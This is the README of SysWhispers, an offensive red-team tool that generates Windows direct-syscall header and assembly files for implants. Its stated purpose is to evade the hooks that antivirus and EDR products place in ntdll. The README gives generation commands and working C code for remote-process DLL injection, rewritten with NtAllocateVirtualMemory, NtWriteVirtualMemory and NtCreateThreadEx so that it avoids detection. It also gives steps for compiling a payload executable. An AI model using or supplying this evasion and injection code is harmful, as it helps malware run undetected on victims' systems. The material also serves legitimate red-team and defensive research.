# SysWhispers

SysWhispers helps with evasion by generating header/ASM files implants can use to make direct system calls.

All core syscalls are supported from Windows XP to 10. Example generated files available in `example-output/`.  

## Introduction

Various security products place hooks in user-mode APIs which allow them to redirect execution flow to their engines and detect for suspicious behaviour. The functions in `ntdll.dll` that make the syscalls consist of just a few assembly instructions, so re-implementing them in your own implant can bypass the triggering of those security product hooks. This technique was popularized by [@Cn33liz](https://twitter.com/Cneelis) and his [blog post](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) has more technical details worth reading.

SysWhispers provides red teamers the ability to generate header/ASM pairs for any system call in the core kernel image (`ntoskrnl.exe`) across any Windows version starting from XP. The headers will also include the necessary type definitions.

The main implementation difference between this and the [Dumpert](https://github.com/outflanknl/Dumpert) POC is that this doesn't call `RtlGetVersion` to query the OS version, but instead does this in the assembly by querying the PEB directly. The benefit is being able to call one function that supports multiple Windows versions instead of calling multiple functions each supporting one version.

## Installation

```bash
> git clone https://github.com/jthuraisamy/SysWhispers.git
> cd SysWhispers
> pip3 install -r .\requirements.txt
> py .\syswhispers.py --help
```

## Usage and Examples

### Command Lines

```powershell
# Export all functions with compatibility for all supported Windows versions (see example-output/).
py .\syswhispers.py --preset all -o syscalls_all

# Export just the common functions with compatibility for Windows 7, 8, and 10.
py .\syswhispers.py --preset common -o syscalls_common

# Export NtProtectVirtualMemory and NtWriteVirtualMemory with compatibility for all versions.
py .\syswhispers.py --functions NtProtectVirtualMemory,NtWriteVirtualMemory -o syscalls_mem

# Export all functions with compatibility for Windows 7, 8, and 10.
py .\syswhispers.py --versions 7,8,10 -o syscalls_78X
```

### Script Output

PS C:\Projects\SysWhispers> py .\syswhispers.py --preset common --out-file syscom

### Before-and-After Example of Classic `CreateRemoteThread` DLL Injection

```
py .\syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls
```

```c
#include <Windows.h>

void InjectDll(const HANDLE hProcess, const char* dllPath)
{
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	
    WriteProcessMemory(hProcess, lpBaseAddress, dllPath, strlen(dllPath), nullptr);
    CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, nullptr);
}
```

```c
#include <Windows.h>
#include "syscalls.h" // Import the generated header.

void InjectDll(const HANDLE hProcess, const char* dllPath)
{
    HANDLE hThread = NULL;
    LPVOID lpAllocationStart = nullptr;
    SIZE_T szAllocationSize = strlen(dllPath);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	
    NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, (PULONG)&szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), nullptr);
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, nullptr);
}
```

## Common Functions

## Importing into Visual Studio

1. Copy the generated H/ASM files into the project folder.
2. In Visual Studio, go to *Project* → *Build Customizations...* and enable MASM.
3. In the *Solution Explorer*, add the .h and .asm files to the project as header and source files, respectively.
4. Go to the properties of the ASM file, and set the *Item Type* to *Microsoft Macro Assembler*.
5. Ensure that the project platform is set to x64. 32-bit projects are not supported at this time.

## Compiling with MinGW

1. Copy the generated H/ASM files into your working folder.
2. Generate the object file with the masm compiler: `"C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\bin\amd64\ml64.exe" /Fo syscalls.lib /c syscalls.asm`
3. Write your payload.c file importing the syscalls header with the directive `#include "syscalls.h"`
4. Compile the payload.c file and specify to link the "syscalls.lib" object file: `i686-w64-mingw32-gcc payload.c -L"C:\folder\of\syscalls.lib" -lsyscalls -o payload.exe -m64 -O0`

You can compile also on linux with mingw. 

The masm assembler (ml64.exe) is not available on linux, but i placed a precompiled syscalls.lib in the "examples-output" directory so you can use the precompiled one in the compilation in point 4.

Or if you prefer you can also compile by yourself the lib with the command 2. on a Windows machine.

## Caveats and Limitations

- Only 64-bit Windows is supported at this time.
- System calls from the graphical subsystem (`win32k.sys`) are not supported.
- Tested on Visual Studio 2019 (v142) with Windows 10 SDK.

## Troubleshooting

- `ModuleNotFoundError` in Python script.
  - Ensure that the required modules are installed with `pip3 install -r requirements.txt`.
- Type redefinitions errors: a project may not compile if typedefs in `syscalls.h` have already been defined.
  - Ensure that only required functions are included (i.e. `--preset all` is rarely necessary).
  - If a typedef is already defined in another used header, then it could be removed from `syscalls.h`.
